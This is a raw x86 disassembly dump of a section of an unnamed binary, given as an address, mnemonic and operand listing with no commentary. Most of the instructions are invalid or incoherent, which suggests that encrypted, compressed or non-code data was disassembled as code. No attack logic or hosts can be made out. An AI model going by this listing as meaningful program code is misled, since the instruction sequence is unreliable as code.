  41f096:	dec    eax
  41f097:	mov    dh,0x62
  41f099:	jnp    0x41f034
  41f09b:	pop    es
  41f09c:	lds    ebx,FWORD PTR [ecx-0xa]
  41f09f:	add    edx,DWORD PTR [esi+ebx*8]
  41f0a2:	push   es
  41f0a3:	pop    esi
  41f0a4:	iret   
  41f0a5:	fwait
  41f0a6:	pop    esp
  41f0a7:	dec    edx
  41f0a8:	les    eax,FWORD PTR [ebx-0x1e]
  41f0ab:	add    DWORD PTR [edi+0x4b],edx
  41f0ae:	cmp    eax,0x8a99c95b
  41f0b3:	scas   al,BYTE PTR es:[edi]
  41f0b4:	into   
  41f0b5:	dec    ecx
  41f0b6:	mov    bl,0x6e
  41f0b8:	stos   BYTE PTR es:[edi],al
  41f0b9:	dec    ebx
  41f0ba:	div    ebp
  41f0bc:	add    eax,0xaecf3820
  41f0c1:	push   cs
  41f0c2:	lock aad 0xac
  41f0c5:	xor    DWORD PTR [ebx+0x2c],0xffffffe3
  41f0c9:	fist   WORD PTR [esi+0x56]
  41f0cc:	cmp    BYTE PTR [ebx],al
  41f0ce:	and    dl,BYTE PTR [ecx+ebp*4+0x3e]
  41f0d2:	ja     0x41f071
  41f0d4:	xor    ah,BYTE PTR [edx-0x17fa0163]
  41f0da:	xchg   bx,ax
  41f0dc:	push   esi
  41f0dd:	stos   BYTE PTR es:[edi],al
  41f0de:	pop    esp
  41f0df:	in     al,dx
  41f0e0:	lods   al,BYTE PTR ds:[esi]
  41f0e1:	jl     0x41f0f2
  41f0e3:	jmp    0x41f142
  41f0e5:	sub    edi,DWORD PTR [ebp+0x55]
  41f0e8:	retf   0x8dd3
  41f0eb:	sbb    al,0x8b
  41f0ed:	sub    eax,0x3988fcd
  41f0f2:	sbb    BYTE PTR [edi+0x1dad3494],bh
  41f0f8:	shr    DWORD PTR [esi-0x7e54dcb8],1
  41f0fe:	add    DWORD PTR [edi+eax*1],ebx
  41f101:	test   eax,0xc8cbf3ef
  41f106:	lea    ebx,[edi]
  41f108:	fs aas 
  41f10a:	or     al,0xf8
  41f10c:	sub    ch,BYTE PTR [esi+0x123c0faf]
  41f112:	mov    edx,0x67b38551
  41f117:	js     0x41f0a4
  41f119:	xor    BYTE PTR [edx-0x2f],bl
  41f11c:	test   al,0x7b
  41f11e:	in     eax,0x2d
  41f120:	push   esi
  41f121:	cs (bad) 
  41f124:	pushf  
  41f125:	push   es
  41f126:	daa    
  41f127:	mov    dl,0x80
  41f129:	rol    DWORD PTR [ebx+0x63ef8945],1
  41f12f:	stos   DWORD PTR es:[edi],eax
  41f130:	push   ebx
  41f131:	rol    BYTE PTR [edi-0x44],cl
  41f134:	mov    ?,WORD PTR [esi+0x11517e00]
  41f13a:	mov    bl,0x84
  41f13c:	daa    
  41f13d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f13e:	rol    DWORD PTR [edi-0x4e],0xfb
  41f142:	xchg   esp,eax
  41f143:	and    BYTE PTR [ecx],ah
  41f145:	mov    edx,0xa0b08686
  41f14a:	bound  ebp,QWORD PTR [ecx+0x5e]
  41f14d:	push   ebx
  41f14e:	mov    edi,0xfed3927c
  41f153:	inc    esi
  41f154:	outs   dx,DWORD PTR ds:[esi]
  41f155:	addr16 mov eax,ds:0x85ea
  41f159:	xchg   edi,eax
  41f15a:	mov    ds:0x31e02f67,eax
  41f15f:	push   ss
  41f160:	pop    esp
  41f161:	pop    eax
  41f162:	mov    edi,DWORD PTR [edx+edi*4]
  41f165:	fucomip st,st(3)
  41f167:	leave  
  41f168:	cmp    BYTE PTR [esi],ch
  41f16a:	mov    BYTE PTR [edi+0x44fa3ec6],dl
  41f170:	fucomp st(0)
  41f172:	sbb    dh,ah
  41f174:	dec    esi
  41f175:	jbe    0x41f1ed
  41f177:	imul   ebx,DWORD PTR [edx],0x56
  41f17a:	aam    0x87
  41f17c:	cli    
  41f17d:	outs   dx,DWORD PTR ds:[esi]
  41f17e:	int3   
  41f17f:	loopne 0x41f1dd
  41f181:	stos   BYTE PTR es:[edi],al
  41f182:	mov    ss,ebx
  41f184:	fld    TBYTE PTR [ecx]
  41f186:	jl     0x41f197
  41f188:	mov    DWORD PTR ds:0x81112fc8,ebx
  41f18e:	cld    
  41f18f:	test   eax,0xb210db59
  41f194:	ja     0x41f12f
  41f196:	call   0x1d28:0xb2e4844f
  41f19d:	mov    ebx,0x5bd236d1
  41f1a2:	gs cmc 
  41f1a4:	xchg   edi,eax
  41f1a5:	mov    eax,0xf84831e6
  41f1aa:	dec    esi
  41f1ab:	or     ebx,DWORD PTR [edi+ecx*4-0x28ddc753]
  41f1b2:	loop   0x41f224
  41f1b4:	sub    eax,0x5d613b49
  41f1b9:	jae    0x41f1c9
  41f1bb:	div    BYTE PTR ds:0x9a8b0f57
  41f1c1:	push   0xb8372157
  41f1c6:	rcr    BYTE PTR [ebx],0x5b
  41f1c9:	rcl    BYTE PTR [esi-0x63],cl
  41f1cc:	push   ss
  41f1cd:	push   0xd5a93381
  41f1d2:	dec    edx
  41f1d3:	mov    dh,0xc5
  41f1d5:	jge    0x41f16c
  41f1d7:	retf   
  41f1d8:	push   esi
  41f1d9:	je     0x41f21e
  41f1db:	pop    edi
  41f1dc:	jno    0x41f1e7
  41f1de:	jge    0x41f230
  41f1e0:	push   cs
  41f1e1:	mov    edi,0xf116858
  41f1e6:	xchg   edx,eax
  41f1e7:	dec    edi
  41f1e8:	add    esp,DWORD PTR [edi]
  41f1ea:	cwde   
  41f1eb:	or     al,0x93
  41f1ed:	out    0x4c,eax
  41f1ef:	call   0x9f7f:0x447ad380
  41f1f6:	aam    0x69
  41f1f8:	inc    esp
  41f1f9:	or     DWORD PTR [edi],eax
  41f1fb:	popf   
  41f1fc:	push   ecx
  41f1fd:	test   DWORD PTR [ebx-0x15],ecx
  41f200:	inc    dx
  41f202:	sbb    edi,esi
  41f204:	and    bl,BYTE PTR [ebx]
  41f206:	jg     0x41f1cf
  41f208:	jmp    0x41f237
  41f20a:	pop    edx
  41f20b:	mov    ch,0x26
  41f20d:	ror    BYTE PTR [ebx-0x1f],cl
  41f210:	pushaw 
  41f212:	xor    bl,BYTE PTR [ecx-0x80]
  41f215:	jb     0x41f1da
  41f217:	jae    0x41f26f
  41f219:	sub    BYTE PTR [ecx-0x34],dl
  41f21c:	arpl   WORD PTR [eax-0x68f69a56],dx
  41f222:	into   
  41f223:	mov    dh,0x4b
  41f225:	lahf   
  41f226:	ins    DWORD PTR es:[edi],dx
  41f227:	ins    BYTE PTR es:[edi],dx
  41f228:	test   al,0xef
  41f22a:	jne    0x41f266
  41f22c:	fcomp  DWORD PTR [esi+ebp*4+0x1b]
  41f230:	jo     0x41f257
  41f232:	test   ch,ch
  41f234:	cmp    eax,0x42ec5640
  41f239:	fucomip st,st(7)
  41f23b:	(bad)  
  41f23c:	lods   eax,DWORD PTR ds:[esi]
  41f23d:	cmp    DWORD PTR [ecx],edx
  41f23f:	aad    0xa6
  41f241:	(bad)  
  41f242:	test   al,0x66
  41f244:	add    DWORD PTR [edi-0x28],ebx
  41f247:	clc    
  41f248:	(bad)  
  41f249:	daa    
  41f24a:	xor    BYTE PTR [ecx+0x66104ea8],dh
  41f250:	outs   dx,BYTE PTR ds:[esi]
  41f251:	shl    edx,1
  41f253:	or     DWORD PTR [ebx*2-0x31635106],ebp
  41f25a:	jbe    0x41f1ec
  41f25c:	and    edi,DWORD PTR [edi*2+0x49defd6a]
  41f263:	sub    al,0x25
  41f265:	icebp  
  41f266:	icebp  
  41f267:	into   
  41f268:	jns    0x41f2af
  41f26a:	pop    esp
  41f26b:	jle    0x41f20f
  41f26d:	inc    eax
  41f26e:	pusha  
  41f26f:	add    al,0x82
  41f271:	dec    edx
  41f272:	cld    
  41f273:	mov    esp,0xd11fd899
  41f278:	test   eax,0xcaae62da
  41f27d:	xchg   ebx,eax
  41f27e:	icebp  
  41f27f:	scas   eax,DWORD PTR es:[edi]
  41f280:	jge    0x41f227
  41f282:	dec    ebp
  41f283:	add    BYTE PTR ss:[edx+0x67],ch
  41f287:	sub    edi,edi
  41f289:	jmp    0x74761a4c
  41f28e:	add    eax,0x59b2758e
  41f293:	inc    DWORD PTR [eax]
  41f295:	sbb    dl,BYTE PTR [ebx+0x27a1277e]
  41f29b:	data16 (bad) 
  41f29d:	mov    eax,0xc3339db8
  41f2a2:	pop    ebx
  41f2a3:	mov    bh,0xe9
  41f2a5:	push   ebx
  41f2a6:	mov    ds,WORD PTR [edi]
  41f2a8:	xor    ebp,DWORD PTR [ebp-0x29]
  41f2ab:	cmp    ch,BYTE PTR [bp+si+0x3c]
  41f2af:	lods   al,BYTE PTR ds:[esi]
  41f2b0:	imul   edi,DWORD PTR [ecx-0x23],0x87d54b71
  41f2b7:	cmc    
  41f2b8:	enter  0xe36f,0xd9
  41f2bc:	int    0xc1
  41f2be:	loopne 0x41f24b
  41f2c0:	hlt    
  41f2c1:	ins    BYTE PTR es:[edi],dx
  41f2c2:	inc    ecx
  41f2c3:	(bad)  
  41f2c4:	dec    edi
  41f2c5:	lock xchg edx,eax
  41f2c7:	or     ch,BYTE PTR [eax+esi*4]
  41f2ca:	paddw  mm2,QWORD PTR [ebp-0x79b53c98]
  41f2d1:	or     al,0x97
  41f2d3:	and    al,0x24
  41f2d5:	scas   al,BYTE PTR es:[edi]
  41f2d6:	lds    ebp,FWORD PTR [ebx+0x676651]
  41f2dc:	loop   0x41f2e0
  41f2de:	pop    ss
  41f2df:	(bad)  
  41f2e0:	cmp    ecx,DWORD PTR [eax]
  41f2e2:	inc    ebx
  41f2e3:	mov    ch,BYTE PTR [esi+0x6b906cca]
  41f2e9:	cmp    ecx,esp
  41f2eb:	mov    DWORD PTR [edi-0x5f8fa87b],ecx
  41f2f1:	aaa    
  41f2f2:	ret    
  41f2f3:	dec    esi
  41f2f4:	into   
  41f2f5:	ins    DWORD PTR es:[di],dx
  41f2f7:	ss cmp al,0x56
  41f2fa:	mov    DWORD PTR ds:0x8abfd96b,esi
  41f300:	jp     0xbaed2706
  41f306:	cli    
  41f307:	aad    0x27
  41f309:	out    dx,al
  41f30a:	sbb    al,0x5a
  41f30c:	out    dx,eax
  41f30d:	inc    esp
  41f30e:	xor    al,0xec
  41f310:	add    al,0xa8
  41f312:	in     eax,dx
  41f313:	push   es
  41f314:	mov    eax,ds:0x1999da1d
  41f319:	dec    ebx
  41f31a:	mov    ch,0x62
  41f31c:	push   ebx
  41f31d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f31e:	adc    ch,al
  41f320:	xlat   BYTE PTR ds:[ebx]
  41f321:	inc    eax
  41f322:	sbb    cl,BYTE PTR [eax-0x45]
  41f325:	jo     0x41f2b4
  41f327:	add    eax,0xda2d91cd
  41f32c:	hlt    
  41f32d:	repnz mov ds:0x2c83773,al
  41f333:	xchg   esi,ebp
  41f335:	push   ebp
  41f336:	mov    WORD PTR [edx],?
  41f338:	mov    al,0xfd
  41f33a:	xor    BYTE PTR [eax],ch
  41f33c:	pusha  
  41f33d:	sbb    ebp,DWORD PTR [edi+0x4b]
  41f340:	inc    esp
  41f341:	ins    BYTE PTR es:[edi],dx
  41f342:	xchg   ebx,eax
  41f343:	or     al,0x2d
  41f345:	jb     0x41f2fe
  41f347:	daa    
  41f348:	jp     0x41f33f
  41f34a:	xchg   edx,eax
  41f34b:	fisttp DWORD PTR [ebx+0x13498704]
  41f351:	jmp    0xa240:0x2f47498b
  41f358:	ja     0x41f35b
  41f35a:	push   esp
  41f35b:	cmp    BYTE PTR [ebp-0x2857157c],ah
  41f361:	js     0x41f32f
  41f363:	ja     0x41f3c2
  41f365:	out    dx,eax
  41f366:	les    edx,FWORD PTR [ebx+esi*2]
  41f369:	hlt    
  41f36a:	inc    ebx
  41f36b:	push   ebp
  41f36c:	or     eax,0xa68c1d0e
  41f371:	inc    edx
  41f372:	sub    esp,DWORD PTR [eax]
  41f374:	mov    dl,0xe8
  41f376:	cmp    bl,ah
  41f378:	ficomp WORD PTR [edx+eax*4+0x2d]
  41f37c:	iret   
  41f37d:	dec    esi
  41f37e:	adc    BYTE PTR [esi-0x47],0x6
  41f382:	mov    esp,0x7d21fa81
  41f387:	or     dl,BYTE PTR [ebx]
  41f389:	push   0x4dc69b5b
  41f38e:	or     BYTE PTR [edx+0x73],dh
  41f391:	jnp    0x41f39a
  41f393:	xchg   esi,eax
  41f394:	test   al,0x46
  41f396:	xchg   edx,eax
  41f397:	in     eax,0xa2
  41f399:	adc    al,0x2c
  41f39b:	in     al,dx
  41f39c:	push   edi
  41f39d:	add    ah,BYTE PTR ds:0x1baf29f
  41f3a3:	mov    al,ds:0xac6f21b4
  41f3a8:	mov    al,ds:0x8f180684
  41f3ad:	xlat   BYTE PTR ds:[ebx]
  41f3ae:	inc    edi
  41f3af:	pop    ds
  41f3b0:	mov    cl,0xcc
  41f3b2:	mov    edx,0x48b2eb39
  41f3b7:	jbe    0x41f373
  41f3b9:	and    eax,0x668d0188
  41f3be:	cli    
  41f3bf:	aam    0x74
  41f3c1:	mov    cl,0x1b
  41f3c3:	ret    0xa771
  41f3c6:	pop    es
  41f3c7:	pop    es
  41f3c8:	test   BYTE PTR [esi+edx*4-0x7b9adae4],0x9f
  41f3d0:	lods   al,BYTE PTR ds:[esi]
  41f3d1:	add    cl,dl
  41f3d3:	cmp    esi,eax
  41f3d5:	add    al,BYTE PTR [esi-0x7ec9f270]
  41f3db:	popa   
  41f3dc:	sbb    DWORD PTR [edx+0x62008aa9],esi
  41f3e2:	add    ebp,DWORD PTR [ebp+0x62]
  41f3e5:	lods   eax,DWORD PTR ds:[esi]
  41f3e6:	(bad)  
  41f3e7:	out    0x69,al
  41f3e9:	jecxz  0x41f3f7
  41f3eb:	ins    DWORD PTR es:[edi],dx
  41f3ec:	fimul  DWORD PTR [edi-0x5c1ffa32]
  41f3f2:	mov    DWORD PTR fs:[esi],esp
  41f3f5:	push   0x4a
  41f3f7:	xchg   esi,eax
  41f3f8:	mov    ecx,DWORD PTR [esi+0x38]
  41f3fb:	mov    eax,ds:0x716e09c7
  41f400:	and    al,0x43
  41f402:	retf   
  41f403:	inc    esi
  41f404:	bound  ecx,QWORD PTR [ecx-0x43]
  41f407:	outs   dx,DWORD PTR ds:[esi]
  41f408:	fmul   DWORD PTR [ebx+edi*8]
  41f40b:	(bad)  
  41f40c:	pushf  
  41f40d:	pop    ebx
  41f40e:	lahf   
  41f40f:	imul   edi,DWORD PTR [eax-0x487bd581],0xffffffe7
  41f416:	out    0xdb,al
  41f418:	xor    DWORD PTR [esi+0x75],edx
  41f41b:	je     0x45ea29c5
  41f421:	xchg   bh,dl
  41f423:	call   0x93be:0x12f0d4cc
  41f42a:	pop    ds
  41f42b:	repz push ss
  41f42d:	shl    DWORD PTR [ebx-0x17bd5d5b],1
  41f433:	sub    al,0xbf
  41f435:	lahf   
  41f436:	das    
  41f437:	cmp    al,0x40
  41f439:	mov    ebp,0x52e8fc43
  41f43e:	sahf   
  41f43f:	lahf   
  41f440:	xchg   ebp,eax
  41f441:	jle    0x41f43d
  41f443:	loope  0x41f3de
  41f445:	shl    BYTE PTR [edi-0x4c],cl
  41f448:	jp     0x41f45d
  41f44a:	js     0x41f48c
  41f44c:	(bad)  
  41f44d:	jg     0x41f434
  41f44f:	pop    edi
  41f450:	popf   
  41f451:	mov    ds:0xd13f9ace,al
  41f456:	add    dl,BYTE PTR [eax+esi*4]
  41f459:	mov    ah,0xe8
  41f45b:	push   edx
  41f45c:	fbstp  TBYTE PTR [edi+0x1c]
  41f45f:	jp     0x41f4e0
  41f461:	jo     0x41f446
  41f463:	loop   0x41f476
  41f465:	inc    edi
  41f466:	mov    ecx,0xf1086b58
  41f46b:	xor    DWORD PTR [ebx+0x189bd6a6],edi
  41f471:	int    0x65
  41f473:	mov    al,0xbc
  41f475:	cmp    edx,DWORD PTR [ecx]
  41f477:	outs   dx,BYTE PTR ds:[esi]
  41f478:	div    DWORD PTR ds:0x42501068
  41f47e:	jnp    0x41f4d9
  41f480:	jno    0x41f4fc
  41f482:	lods   eax,DWORD PTR ds:[esi]
  41f483:	ret    
  41f484:	call   0x5f29:0xc2f6dce7
  41f48b:	dec    ecx
  41f48c:	jbe    0x41f4e0
  41f48e:	inc    ebp
  41f48f:	sar    BYTE PTR [ebx],0x89
  41f492:	inc    edi
  41f493:	and    ch,BYTE PTR [edi]
  41f495:	nop    DWORD PTR [ecx-0xba4617f]
  41f49c:	add    ebx,DWORD PTR [ebp+0x58]
  41f49f:	sbb    BYTE PTR [edx+0x3fa8649f],al
  41f4a5:	mov    cl,BYTE PTR [edx]
  41f4a7:	inc    ebp
  41f4a8:	and    al,dh
  41f4aa:	jl     0x41f4be
  41f4ac:	repnz add esp,ebx
  41f4af:	pop    esp
  41f4b0:	aad    0xa9
  41f4b2:	cmc    
  41f4b3:	cli    
  41f4b4:	jne    0x41f52a
  41f4b6:	out    0xf8,al
  41f4b8:	push   ebx
  41f4b9:	jl     0x41f4bd
  41f4bb:	mov    WORD PTR [ebx+ecx*2+0x398905d],?
  41f4c2:	sub    dh,al
  41f4c4:	dec    esp
  41f4c5:	ins    DWORD PTR es:[edi],dx
  41f4c6:	dec    ecx
  41f4c7:	pop    edi
  41f4c8:	push   esi
  41f4c9:	js     0x41f46a
  41f4cb:	ja     0x41f4e4
  41f4cd:	mov    esp,0xda8fb4fa
  41f4d2:	icebp  
  41f4d3:	jp     0x41f4bf
  41f4d5:	add    ebp,DWORD PTR [ebx+0x3e]
  41f4d8:	pop    esi
  41f4d9:	mov    eax,ds:0x82206a37
  41f4de:	in     eax,dx
  41f4df:	jnp    0x41f504
  41f4e1:	mov    ah,0xc2
  41f4e3:	cdq    
  41f4e4:	xlat   BYTE PTR ds:[ebx]
  41f4e5:	imul   ebx,edi,0x25724e1e
  41f4eb:	pop    esi
  41f4ec:	clc    
  41f4ed:	scas   al,BYTE PTR es:[edi]
  41f4ee:	fwait
  41f4ef:	inc    ecx
  41f4f0:	jae    0x41f4d8
  41f4f2:	mul    DWORD PTR [esi+edi*4+0x475b7e9d]
  41f4f9:	fmul   QWORD PTR [edi+eax*8]
  41f4fc:	adc    eax,0xea7c611b
  41f501:	dec    ebx
  41f502:	fild   QWORD PTR [esi+0x7e8cbddd]
  41f508:	loopne 0x41f4e8
  41f50a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f50b:	(bad)  
  41f50c:	call   0x4974a637
  41f511:	dec    esp
  41f512:	mov    ebp,DWORD PTR [eax+0x10]
  41f515:	mov    edx,0xabfead49
  41f51a:	xor    ecx,DWORD PTR [ebx-0x5]
  41f51d:	aad    0xd6
  41f51f:	aas    
  41f520:	mov    esp,0xb43546f5
  41f525:	mov    edi,0xdadd2b52
  41f52a:	or     ebx,DWORD PTR ds:0x93d4c003
  41f530:	ss aaa 
  41f532:	outs   dx,BYTE PTR ds:[esi]
  41f533:	imul   edx,DWORD PTR [edi+0x74],0xffffffd0
  41f537:	mov    esi,0x779ae7e1
  41f53c:	ror    esi,1
  41f53e:	pushf  
  41f53f:	xor    BYTE PTR [esi+0x7b],bl
  41f542:	adc    BYTE PTR [ecx],0x7b
  41f545:	mov    al,0xc0
  41f547:	inc    ecx
  41f548:	pop    ebp
  41f549:	jno    0x41f573
  41f54b:	mov    dl,0x2e
  41f54d:	call   0xd5b62352
  41f552:	xchg   edi,eax
  41f553:	aaa    
  41f554:	aam    0x5f
  41f556:	in     al,dx
  41f557:	imul   edi,DWORD PTR ds:0x7fe9b053,0x46
  41f55e:	push   eax
  41f55f:	bound  esi,QWORD PTR [ebx+0x1c910c78]
  41f565:	sub    cl,ah
  41f567:	call   0x943f:0xa12cb5b6
  41f56e:	inc    esp
  41f56f:	(bad)  
  41f570:	js     0x41f579
  41f572:	outs   dx,DWORD PTR ds:[esi]
  41f573:	ins    DWORD PTR es:[edi],dx
  41f574:	enter  0xf71c,0x47
  41f578:	xchg   DWORD PTR [ebx+edi*2-0x24],ecx
  41f57c:	in     al,0xbe
  41f57e:	fnstsw WORD PTR [ecx-0xa0dc523]
  41f584:	mov    cl,0x7
  41f586:	imul   eax,esp,0xef1f8052
  41f58c:	retf   0x6b9d
  41f58f:	xchg   ebx,eax
  41f590:	inc    edx
  41f591:	iret   
  41f592:	fst    DWORD PTR [ecx]
  41f594:	mov    bl,0x4c
  41f596:	jl     0x41f5ef
  41f598:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f599:	sbb    eax,0x45fe3519
  41f59e:	data16 loop 0x41f606
  41f5a1:	test   ebx,0xd053a7e1
  41f5a7:	pop    eax
  41f5a8:	call   0x7a6e732b
  41f5ad:	mov    ds:0x71eac59f,eax
  41f5b2:	xor    DWORD PTR [ecx],ebp
  41f5b4:	bound  esp,QWORD PTR [ebp+eax*8+0x422a67f5]
  41f5bb:	adc    ecx,eax
  41f5bd:	xchg   ebp,eax
  41f5be:	xor    eax,0xbe08c085
  41f5c3:	mov    al,ds:0x6ee9515
  41f5c8:	and    BYTE PTR [esi+0x62],cl
  41f5cb:	jae    0x41f56c
  41f5cd:	push   ebx
  41f5ce:	and    BYTE PTR [eax-0x55d15aae],0x38
  41f5d5:	jle    0x41f650
  41f5d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f5d8:	add    ebx,ebp
  41f5da:	jb     0x41f5b8
  41f5dc:	sub    eax,0xb112971
  41f5e1:	jl     0x41f568
  41f5e3:	lea    edi,[ebp+0x6655d370]
  41f5e9:	jecxz  0x41f5b7
  41f5eb:	sar    ebp,cl
  41f5ed:	sbb    al,0x28
  41f5ef:	ins    BYTE PTR es:[edi],dx
  41f5f0:	sbb    BYTE PTR [ebp+ebx*2-0x36],ah
  41f5f4:	aaa    
  41f5f5:	inc    ebp
  41f5f6:	sub    dh,BYTE PTR [eax+eax*4]
  41f5f9:	mov    al,ds:0xa6f0ec6b
  41f5fe:	mov    dl,0x23
  41f600:	or     BYTE PTR [ebx+0x49],0x5b
  41f604:	mov    al,0xa6
  41f606:	jae    0x41f597
  41f608:	jecxz  0x41f600
  41f60a:	in     eax,0xbd
  41f60c:	sar    DWORD PTR [eax],1
  41f60e:	popa   
  41f60f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f610:	xor    BYTE PTR [esi],al
  41f612:	or     DWORD PTR [eax+edi*8-0x14],edx
  41f616:	fisttp WORD PTR [eax]
  41f618:	push   ebx
  41f619:	jecxz  0x41f61a
  41f61b:	jge    0x41f603
  41f61d:	retf   0x73f6
  41f620:	mov    ecx,0xfb8f7eec
  41f625:	xchg   BYTE PTR [ebp+edi*4+0x6f],cl
  41f629:	add    dh,BYTE PTR ds:0xfb29c7d5
  41f62f:	xor    eax,0x3139e434
  41f634:	stos   BYTE PTR es:[edi],al
  41f635:	xchg   edx,eax
  41f636:	loop   0x41f699
  41f638:	ret    0x940b
  41f63b:	push   edi
  41f63c:	leave  
  41f63d:	mov    esi,0x21647090
  41f642:	(bad)  
  41f643:	loopne 0x41f63b
  41f645:	(bad)  
  41f646:	(bad)  
  41f647:	gs dec esi
  41f649:	out    0x83,eax
  41f64b:	arpl   WORD PTR [esi-0x6e],cx
  41f64e:	into   
  41f64f:	fs je  0x41f5f2
  41f652:	les    edx,FWORD PTR [edi+0x76e813f8]
  41f658:	xchg   edx,eax
  41f659:	or     DWORD PTR [edi+edx*2],edx
  41f65c:	out    dx,eax
  41f65d:	mov    al,0xc8
  41f65f:	icebp  
  41f660:	popa   
  41f661:	rcr    ebx,cl
  41f663:	outs   dx,DWORD PTR ds:[esi]
  41f664:	aas    
  41f665:	scas   al,BYTE PTR es:[edi]
  41f666:	jp     0x41f6a5
  41f668:	inc    edx
  41f669:	dec    ebp
  41f66a:	inc    edx
  41f66b:	or     DWORD PTR [esi-0x65],0x78
  41f66f:	mov    ah,BYTE PTR [eax]
  41f671:	jg     0x41f65d
  41f673:	fsub   DWORD PTR [eax-0x64322fa0]
  41f679:	push   es
  41f67a:	xchg   esp,eax
  41f67b:	pusha  
  41f67c:	dec    edx
  41f67d:	pop    edx
  41f67e:	rcr    DWORD PTR [eax-0x56],cl
  41f681:	ret    0x4ad4
  41f684:	push   es
  41f685:	and    ecx,esi
  41f687:	dec    ebp
  41f688:	add    DWORD PTR [eax-0x18],ebx
  41f68b:	push   edi
  41f68c:	mov    cs,WORD PTR [ecx-0x29]
  41f68f:	cmp    al,0xa2
  41f691:	or     al,0x4a
  41f693:	adc    eax,DWORD PTR [edi+esi*2]
  41f696:	mov    bh,0xa8
  41f698:	ret    
  41f699:	lds    edx,FWORD PTR [edi]
  41f69b:	and    al,al
  41f69d:	cmp    eax,0xf0c81087
  41f6a2:	fadd   st(3),st
  41f6a4:	adc    DWORD PTR [edi-0x4897b940],0x76
  41f6ab:	test   DWORD PTR [esp+edx*4-0x40d2139f],ebx
  41f6b2:	jne    0x41f681
  41f6b4:	inc    DWORD PTR [edx-0x67]
  41f6b7:	scas   eax,DWORD PTR es:[edi]
  41f6b8:	jl     0x41f72c
  41f6ba:	pusha  
  41f6bb:	lock ror edi,cl
  41f6be:	fadd   DWORD PTR [edi+0x2907a20b]
  41f6c4:	idiv   ch
  41f6c6:	pop    edx
  41f6c7:	jno    0x41f713
  41f6c9:	sbb    eax,0x63c3f0a5
  41f6ce:	inc    edi
  41f6cf:	adc    eax,0x8e28e7bb
  41f6d4:	fisubr WORD PTR [eax]
  41f6d6:	push   es
  41f6d7:	fadd   DWORD PTR [ecx-0x1578e862]
  41f6dd:	and    cl,BYTE PTR [ebx]
  41f6df:	rol    DWORD PTR [eax-0x12],0x1c
  41f6e3:	sub    dl,ah
  41f6e5:	out    dx,al
  41f6e6:	int    0x1e
  41f6e8:	dec    esp
  41f6e9:	icebp  
  41f6ea:	xchg   BYTE PTR [edi+0xe],cl
  41f6ed:	push   eax
  41f6ee:	pop    eax
  41f6ef:	cmp    DWORD PTR [eax+0x2],ecx
  41f6f2:	(bad)  
  41f6f3:	std    
  41f6f4:	cmp    dh,ch
  41f6f6:	adc    eax,0x417f86fb
  41f6fb:	add    DWORD PTR [ecx],esi
  41f6fd:	imul   ebx,eax,0xffffffc5
  41f700:	nop
  41f701:	aaa    
  41f702:	jb     0x41f6c6
  41f704:	push   0xffffffc8
  41f706:	pop    ebx
  41f707:	mov    edx,DWORD PTR [ecx-0x36008905]
  41f70d:	pop    edx
  41f70e:	jmp    0x5f974fd
  41f713:	jno    0x41f77d
  41f715:	call   0xa53c6d17
  41f71a:	ins    BYTE PTR es:[edi],dx
  41f71b:	xor    al,0xcf
  41f71d:	gs push edx
  41f71f:	pop    edx
  41f720:	push   eax
  41f721:	mov    DWORD PTR [ecx-0x42d2e02],0x60349867
  41f72b:	fadd   st(0),st
  41f72d:	test   BYTE PTR [ebp-0x54],0x36
  41f731:	inc    esp
  41f732:	or     ebp,DWORD PTR [ebx]
  41f734:	pop    es
  41f735:	jge    0x41f7ae
  41f737:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f738:	mov    dh,0x99
  41f73a:	push   ecx
  41f73b:	outs   dx,BYTE PTR ds:[esi]
  41f73c:	scas   al,BYTE PTR es:[edi]
  41f73d:	xor    dl,cl
  41f73f:	enter  0x9c7e,0x23
  41f743:	push   0x8670bb77
  41f748:	clc    
  41f749:	add    eax,0x64acfc8f
  41f74e:	dec    edi
  41f74f:	xor    DWORD PTR [edx*2+0x5fe047db],0xffffff8c
  41f757:	stos   DWORD PTR es:[edi],eax
  41f758:	or     eax,0xbab5b7fc
  41f75d:	sbb    al,0x4f
  41f75f:	cmp    DWORD PTR [edx],edi
  41f761:	gs mov dh,0xfe
  41f764:	or     bh,BYTE PTR [edx+0x23]
  41f767:	loope  0x41f702
  41f769:	or     eax,0x672adcb8
  41f76e:	or     esi,DWORD PTR [edx]
  41f770:	pop    edi
  41f771:	lea    ebx,[edx]
  41f773:	mov    dh,0x2d
  41f775:	ret    0x5842
  41f778:	icebp  
  41f779:	sub    ebp,DWORD PTR [edx+0x23]
  41f77c:	(bad)  
  41f77d:	push   0x78
  41f77f:	retf   0x83ef
  41f782:	push   0x690315a8
  41f787:	push   ecx
  41f788:	fld    DWORD PTR [ecx]
  41f78a:	lods   eax,DWORD PTR ds:[esi]
  41f78b:	and    BYTE PTR [eax],bl
  41f78d:	mul    BYTE PTR [eax+0x7169b85e]
  41f793:	out    dx,eax
  41f794:	xchg   ebx,eax
  41f795:	pop    edx
  41f796:	fist   WORD PTR [ebx-0x7a93dc0e]
  41f79c:	lea    esi,[ebp+0x76751c92]
  41f7a2:	fwait
  41f7a3:	mov    DWORD PTR [edx],ebx
  41f7a5:	xchg   DWORD PTR [ecx],edi
  41f7a7:	cmp    eax,0x78905801
  41f7ac:	lock retf 
  41f7ae:	push   0x12c9be6a
  41f7b3:	fsubr  DWORD PTR [ebx-0x7e]
  41f7b6:	fadd   DWORD PTR [edx+0x44]
  41f7b9:	stc    
  41f7ba:	sbb    ecx,edx
  41f7bc:	cmp    DWORD PTR [esi+0x54],edx
  41f7bf:	jg     0x41f7fb
  41f7c1:	jo     0x41f7a5
  41f7c3:	xor    ebp,eax
  41f7c5:	int    0xd8
  41f7c7:	mov    esp,0x397eb00e
  41f7cc:	sti    
  41f7cd:	xor    DWORD PTR [ecx+0x21],ecx
  41f7d0:	adc    esi,edi
  41f7d2:	or     bh,BYTE PTR [eax]
  41f7d4:	mov    dh,BYTE PTR [edx+0x2513931d]
  41f7da:	test   DWORD PTR [edx+0x1893311c],ebp
  41f7e0:	in     al,dx
  41f7e1:	add    ebx,DWORD PTR [ecx-0x712245a]
  41f7e7:	test   eax,0x54d91af
  41f7ec:	dec    ecx
  41f7ed:	in     eax,0xe2
